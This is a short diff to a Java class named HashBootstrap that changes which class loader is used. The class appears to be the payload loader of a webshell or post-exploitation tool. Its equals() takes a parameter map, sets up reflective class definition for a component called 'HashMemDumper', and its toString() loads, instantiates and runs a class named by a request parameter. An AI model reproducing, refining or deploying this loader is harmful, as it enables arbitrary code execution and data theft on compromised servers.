@@ -8,7 +8,7 @@ public class HashBootstrap {
     public boolean equals(Object obj) {
         try {
             this.parameterMap = (HashMap) obj;
-            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+            ClassLoader classLoader = this.getClass().getClassLoader();
             String[] deps = {"HashMemDumper"};
             Method defineClassMethod = null;
             try {
@@ -85,7 +85,7 @@ public class HashBootstrap {
     public String toString() {
         try {
             String proxyType = new String((byte[]) this.parameterMap.get("proxyType"));
-            Class clazz = Thread.currentThread().getContextClassLoader().loadClass(proxyType);
+            Class clazz = this.getClass().getClassLoader().loadClass(proxyType);
             Object instance = clazz.newInstance();
             Method equalsMethod = clazz.getMethod("equals", Object.class);
             equalsMethod.invoke(instance, this.parameterMap);
